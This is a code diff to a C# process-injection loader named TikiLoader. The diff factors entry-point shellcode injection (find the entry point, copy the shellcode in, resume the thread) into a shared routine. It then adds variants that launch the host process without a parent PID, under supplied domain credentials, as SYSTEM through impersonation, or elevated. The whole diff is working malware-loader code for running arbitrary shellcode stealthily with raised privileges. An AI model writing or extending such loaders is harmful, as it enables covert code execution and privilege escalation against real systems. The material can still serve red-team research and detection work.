@@ -104,15 +104,43 @@ namespace TikiLoader
                 ZwUnmapViewOfSection(section_, localmap_);
         }
 
+        private void AOERoutine(PROCESS_INFORMATION pInfo, byte[] shellcode)
+        {
+            FindEntry(pInfo.hProcess);
+            CopyShellcode(pInfo, shellcode);
+            ResumeThread(pInfo.hThread);
+            CloseHandle(pInfo.hThread);
+            CloseHandle(pInfo.hProcess);
+        }
+
         public void AOE(string binary, byte[] shellcode, int ppid)
         {
             var pinf = StartProcess(binary, ppid);
+            AOERoutine(pinf, shellcode);
+        }
 
-            FindEntry(pinf.hProcess);
-            CopyShellcode(pinf, shellcode);
-            ResumeThread(pinf.hThread);
-            CloseHandle(pinf.hThread);
-            CloseHandle(pinf.hProcess);
+        public void AOEWithoutPid(string binary, byte[] shellcode)
+        {
+            var pinf = StartProcessWOPid(binary);
+            AOERoutine(pinf, shellcode);
+        }
+
+        public void AOEAs(string binary, byte[] shellcode, string domain, string username, string password)
+        {
+            var pinf = StartProcessAs(binary, domain, username, password);
+            AOERoutine(pinf, shellcode);
+        }
+
+        public void AOEAsSystem(string binary, byte[] shellcode, int impersonationPid)
+        {
+            var pinf = StartProcessAsSystem(binary, impersonationPid);
+            AOERoutine(pinf, shellcode);
+        }
+
+        public void AOEElevated(string binary, byte[] shellcode, int elevatedPid)
+        {
+            var pinf = StartElevatedProcess(binary, elevatedPid);
+            AOERoutine(pinf, shellcode);
         }
 
         public AOEer()
